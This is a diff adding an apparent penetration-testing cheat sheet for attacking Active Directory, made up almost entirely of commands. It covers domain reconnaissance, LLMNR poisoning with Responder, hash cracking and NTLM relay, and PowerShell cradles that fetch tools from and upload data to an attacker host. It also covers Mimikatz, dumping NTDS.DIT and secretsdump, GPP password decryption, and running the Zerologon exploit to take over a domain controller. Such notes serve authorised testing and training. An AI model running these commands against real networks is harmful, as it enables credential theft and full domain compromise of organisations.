@@ -1,0 +1,296 @@
+Active Directory
+
+
+# Recon
+
+net view /all                                     Show all shares
+net view /all /domain                             Show all shares in the domain
+nltest /domain_trusts /all_trusts                 Show domain trusts
+nltest /dclist:<domain>                           Show domain controllers for a given domain
+net localgroup "administrator"                    Show users in the local administrator group
+net group "domain admins" /domain                 Show users in the domain admins Security Group
+
+AdFind.exe -f "(objectcategory=person)"
+AdFind.exe -f "(objectcategory=computer)"
+AdFind.exe -f "(objectcategory=organizationalUnit)"
+AdFind.exe -sc trustdmp
+AdFind.exe -subnets -f "(objectCategory=subnet)"
+AdFind.exe -f "(objectcategory=group)"
+AdFind.exe -gcb -sc trustdmp
+
+net user /domain                                  Show all domain users
+net user <user> /domain                           Show all Security Groups a domain user belongs to
+net group /domain                                 Show all Security Groups in a domain
+
+- Other
+dig -t SRV _gc._tcp.lab.acme.org                  Global catalog
+dig -t SRV _ldap._tcp.acme.org                    LDAP servers
+dig -t SRV _kerberos._tcp.acme.org                Kerberos KDC
+dig -t SRV _kpasswd._tcp.acme.org                 Kerberos password change server
+
+nmap --script dns-srv-enum --script-args "dns-srv-enum.domain='acme.org'"
+
+Using Windows > cmd > powershell
+[System.DirectoryServices.ActiveDirectory.Domain]::GetCurrent Domain()
+Look for PdcRoleOwner and Name
+------------------------------------------------------------------------------------------------------
+
+# Responder
+
+Use Responder to poison LLMNR/NBT-NS requests and capture NTLM/NTLNv2 hashes. This happens when you
+    try to identify a host and DNS fails.
+
+responder -A -I eth0
+responder -I eth0 -wrd
+
+- Crack the hash
+hashcat -m 5600 hash.txt /usr/share/wordlists/rockyou.txt
+
+- Relay NTLMv2 hashes if SMB Signing is disabled.
+cd /opt/CrackMapExec/cme/thirdparty/impacket/examples/
+ntlmrelayx.py
+
+- Host discovery and enumeration
+netdiscover -i eth0 -r <CIDR>
+nmap -Pn -n -T4 --open -p- -sC -sV -iL targets.txt
+    Or use Discover which combines nmap, nmap scripts and Metasploit auxiliary modules.
+------------------------------------------------------------------------------------------------------
+
+# BloodHound
+
+cd /usr/bin
+./neo4j console
+
+firefox http://localhost:7474/ &
+username/password: neo4j
+Change the password
+
+cd /opt/BloodHound-v3/Ingestors/
+python -m SimpleHTTPServer
+
+- Windows
+cd to a discrete, writable directory (C:\Users\<user>\Desktop)
+powershell -nop -exec bypass "IEX (New-Object Net.Webclient).DownloadFile('http://192.168.1.5:8000/SharpHound.exe', 'SharpHound.exe')"
+
+SharpHound.exe -c LoggedOn                        Run the following as a user that has admin rights
+SharpHound.exe -c Session                         On subseqequent runs just collect session data
+
+This will generate a zip file
+
+Upload the zip file to Kali
+powershell -nop -exec bypass "IEX (New-Object Net.Webclient).UploadString('http://192.168.1.5/sharp.zip',"<PostDATA>")"
+
+- BloodHound UI
+cd /opt/BloodHound-3/BloodHound-linux-x64/
+./BloodHound --no-sandbox
+Login
+Drag and drop the zip file into the UI
+------------------------------------------------------------------------------------------------------------------------------------------------------
+
+# ADACLScanner
+
+cd to a discrete, writable directory (C:\Users\<user>\Desktop)
+powershell -nop -exec bypass "IEX (New-Object Net.Webclient).DownloadFile('http://192.168.1.5:8000/ADACLScan.ps1', 'ADACLScan.ps1')"
+
+.\ADACLScan.ps1 -Base "OU=CORP,DC=CONTOS,DC=COM"
+
+    or (default is CSV output)
+
+.\ADACLScan.ps1 -Base "OU=CORP,DC=CONTOS,DC=COM" -HTML
+
+File will be saved to something like: domain_DOMAIN_adAclOutput<date>_<time>.csv or .htm
+------------------------------------------------------------------------------------------------------------------------------------------------------
+
+# Domain Controller (DC)
+
+nbtstat -a <target IP>
+
+The netbios hex code “1C” next to the domain name signifies that the system being polled is a domain
+controller for the domain name listed on the left. If the “1C” would have been next to an Inet service
+it would have signified it was an IIS server.
+
+Note the differences between the U and the G. U = UNIQUE and G = GROUP. When you see a hex code next
+to UNIQUE it is usually associated with the computer itself. With GROUP it is associated with the
+workgroup or domain.
+
+- Use the following MSF module to authenticate to the DC via SMB, create a volume shadow copy of the
+system drive, and downloads copies of NTDS.DIT and SYSTEM hive. Then use Impacket to perform
+extraction of the hashes.
+auxiliary/admin/smb/psexec_ntdsgrab
+impacket-secretsdump -system SYSTEM -ntds NTDS.DIT LOCAL
+
+impacket-secretsdump -hashes <hash> -just-dc LAB/dc\$@10.0.0.1
+------------------------------------------------------------------------------------------------------------------------------------------------------
+
+# Extract passwords from Group Policy
+
+powershell.exe -nop -exec bypass
+Import-Module PowerSploit.ps1
+Get-GPPPassword
+
+\\<DOMAIN>\SYSVOL\<DOMAIN>\Policies\
+Search xml files for cpassword.
+GetDecryptedCpassword 'AES 256-bit encrypted password'
+------------------------------------------------------------------------------------------------------------------------------------------------------
+
+# Show DCs
+dsquery server
+get-netdomaincontroller
+net group “domain controllers” /domain
+net view \\<server>                               DCs contain SYSVOL and NETLOGON shares
+cmd.exe /c set                                    LOGONSERVER variable
+
+# Show DC in a specific domain
+dsquery server -domain <something.int>
+get-netdomaincontroller -domain <something.int>
+nslookup <something.int>                          Internally, this will likely return DCs that are DNS servers
+nslookup                                          pseudo-shell
+    set type=all
+    _ldap._tcp.<something.int>
+nbtstat -a                                        Look for the attribute 1C
+
+# Show DCs forest-wide
+dsquery server -forest
+get-netforestdomain
+
+# Show Computer Account Objects
+Show computer accounts
+dsquery computer
+dsquery * -filter “(objectclass=computer)” -attr dnshostname,description,operatingsystem,operatingsystemversion -limit 0
+get-netcomputer
+get-netcomputer -fulldata | select-object dnshostname,description,operatingsystem,operatingsystemversion
+
+# Show servers based on description
+dsquery * -filter “&(objectclass=computer)(operatingsystem=*server*)” -attr dnshostname,description,operatingsystem,operatingsystemversion -limit 0
+------------------------------------------------------------------------------------------------------------------------------------------------------
+
+# Show all Active Directory (AD) user accounts
+dsquery user -limit 0
+get-netuser 			This will display all accounts and their attributes.
+get-netuser | select-object samaccountname
+
+# Show attributes of a user account
+dsquery * -filter “&(objectclass=user)(samaccountname=<user>)” -attr *
+get-net-user <user>
+
+# Show users with no password expiration
+dsquery * -filter “&(objectclass=user)(useraccountcontrol>=65535)” -attr samaccountname,name
+get-netuser -filter "useraccountcontrol>=65535" | select-object samaccountname,name
+
+# Show user accounts and their associated Service Principal Names (SPNs)
+dsquery.exe * -filter "(serviceprincipalname=*)" -attr samaccountname, serviceprincipalname
+dsquery.exe * -filter "&(serviceprincipalname=*)(samaccounttype=805306368)" -attr samaccountname,serviceprincipalname
+get-netuser -spn | select-object samaccountname,serviceprincipalname
+------------------------------------------------------------------------------------------------------------------------------------------------------
+
+# Show administrators
+dsquery * -filter “&(objectclass=user)(admincount=1)” -attr samaccountname,name
+dsquery * -filter “&(objectclass=group)(name=*admin*)” -attr member -limit 0 -l
+dsquery group -name *admin*
+get-netuser -admincount | select-object samaccountname,name
+get-netgroup -fulldata -groupname "*admin*" | select-object member
+
+# Show administrators with no password expiration
+dsquery * -filter “&(objectclass=user)(useraccountcontrol>=65535)(admincount=1)” -attr samaccountname,name
+get-netuser -filter "(useraccountcontrol>=65535)(admincount=1)" | select-object samaccountname,name
+
+# Show domain admins
+dsquery * -filter “name=domain admins” -attr member -l
+get-netgroup -fulldata -groupname "domain admins" | select-object member
+net group “domain admins” /domain
+
+# Show enterprise admins
+dsquery * -filter “name=enterprise admins” -attr member -d <forest domain.int> 
+get-netgroup -fulldata -groupname "enterprise admins" | select-object member
+net group “enterprise admins” /domain
+
+# Show local administrators on DCs
+dsquery * -filter “name=administrators” -attr member -l
+get-netgroup -fulldata -groupname "administrators" | select-object member
+net localgroup administrators /domain
+------------------------------------------------------------------------------------------------------------------------------------------------------
+
+# Show Organizational Units (OU)
+dsquery ou -limit 0
+get-netou
+get-netou -fulldata
+
+# Show users under a specific OU
+dsquery * “ou=something,dc=domain,dc=int” -filter objectclass=user
+
+# Show child OUs under parent OU
+dsquery * “ou=something,dc=domain,dc=int” -filter objectcategory=organizationalunit) -attr name
+------------------------------------------------------------------------------------------------------------------------------------------------------
+
+# Show All Group Policy Objects (GPO) data
+dsquery * -filter “(objectclass=grouppolicycontainer)” -attr *
+get-netgpo
+
+# Map GPO names (UUID) to display names
+dsquery * -filter “(objectclass=grouppolicycontainer)” -attr name,displayname
+get-netgpo | select-object name,displayname
+
+# Show OUs and applied GPOs
+dsquery * -filter “(objectcategory=organizationalunit)” -attr distinguishedname, gplink
+get-netou -fulldata | select-object distinguishedname, gplink
+------------------------------------------------------------------------------------------------------------------------------------------------------
+
+# Show Trust Relationships
+dsquery * -filter “(objectclass=TrustedDomain)” -attr trustpartner,flatname,trustdirection
+get-netdomaintrust
+
+# Show Sites and Subnets
+dsquery subnet
+get-netsubnet
+dsquery site
+get-netsite
+dsquery * “cn=subnets,cn=sites,cn=configuration,dc=<something>,dc=<int>” -attr description,cn,siteobject
+
+# Show Active Directory Partitions
+dsquery partition
+------------------------------------------------------------------------------------------------------------------------------------------------------
+
+# Dump the DC database
+
+powershell -nop -exec bypass
+Import-Module PowerView
+Invoke-UserHunter
+Import-Module PowerSploit
+Invoke-Mimikatz -ComputerName <name>
+
+Open a new PS window as Administrator
+Use the creds you just found
+
+Import-Module PowerView
+Get-NetDomainController
+Import-Module PowerSploit
+Invoke-NinjaCopy -Path C:\windows\ntds\ntds.dit -LocalDistination C:\ntds.dit -ComputerName <DC name>
+ls
+------------------------------------------------------------------------------------------------------------------------------------------------------
+
+# Zerologon CVE-2020-1472
+
+apt install python3-virtualenv
+virtualenv --python python3.8 zerologon-virtualenv
+cd zerologon-virtualenv/bin
+source ./activate
+./pip3 install git+https://github.com/SecureAuthCorp/impacket.git
+cd ../..
+
+git clone https://github.com/SecuraBV/CVE-2020-1472.git
+mv CVE-2020-1472 scanner
+cd scanner
+pip install -r requirements.txt
+chmod 755 zerologon_tester.py
+zerologon_tester.py <dc-name> <dc-ip>
+
+cd ..
+git clone https://github.com/dirkjanm/CVE-2020-1472.git
+mv CVE-2020-1472 exploit
+cd exploit
+chmod 755 *.py
+./cve-2020-1472-exploit.py <dc-name> <dc-ip>
+
+cd ../zerologon-virtualenv/bin/
+secretsdump.py -no-pass -just-dc lab.corp/dc-1\$@192.168.0.20
+
